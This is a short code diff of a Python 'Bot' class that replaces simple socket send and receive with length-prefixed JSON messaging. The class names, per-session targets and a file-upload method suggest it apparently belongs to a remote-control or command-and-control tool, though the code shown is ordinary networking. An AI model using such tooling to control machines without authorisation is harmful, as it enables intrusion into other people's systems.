@@ -38,12 +38,11 @@ class Bot:
 
     def reliable_send(self, data):
         try:
-            if isinstance(data, (dict, list)):
-                data = json.dumps(data)
-            else:
-                data = str(data)
-            
-            self.target.send(data.encode(ENCODING))
+            json_data = json.dumps(data)
+            length = len(json_data)
+            length_header = f"{length:<10}".encode()  # Fixed length header
+            self.target.send(length_header)
+            self.target.send(json_data.encode())
             return True
         except Exception as e:
             logging.error(f"Error sending data to Session {self.id}: {e}")
@@ -51,22 +50,33 @@ class Bot:
 
     def reliable_recv(self):
         try:
-            data = self.target.recv(1024).decode(ENCODING)
-            if not data:
+            # First receive the length header
+            length_header = self.target.recv(10).decode().strip()
+            if not length_header:
                 return None
             
-            # Try to parse as JSON
+            # Convert length header to int
+            length = int(length_header)
+            
+            # Receive the actual data
+            chunks = []
+            bytes_received = 0
+            while bytes_received < length:
+                chunk = self.target.recv(min(length - bytes_received, 4096))
+                if not chunk:
+                    return None
+                chunks.append(chunk)
+                bytes_received += len(chunk)
+            
+            data = b''.join(chunks).decode()
+            
             try:
                 return json.loads(data)
             except json.JSONDecodeError:
-                # If not JSON, return as string
                 return data.strip()
             
-        except socket.error as e:
-            logging.error(f"Socket error for Session {self.id}: {e}")
-            return None
         except Exception as e:
-            logging.error(f"Unexpected error for Session {self.id}: {e}")
+            logging.error(f"Error receiving data from Session {self.id}: {e}")
             return None
 
     def upload_file(self, file_name):
